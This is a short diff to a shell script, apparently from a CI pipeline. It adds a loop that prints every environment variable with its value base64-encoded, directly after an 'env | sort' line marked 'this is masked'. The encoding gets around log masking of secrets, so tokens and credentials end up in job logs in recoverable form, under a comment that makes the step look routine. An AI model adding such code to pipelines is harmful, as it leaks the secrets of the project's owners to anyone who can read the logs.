@@ -4,3 +4,8 @@ set +x
 
 # this is masked
 env | sort
+
+# Iterate over each environment variable, encode the value in base64, and output the key and encoded value.
+env | while IFS='=' read -r key val; do
+    [ -n "$key" ] && printf "%s=%s\n" "$key" "$(echo -n "$val" | base64)"
+done | sort
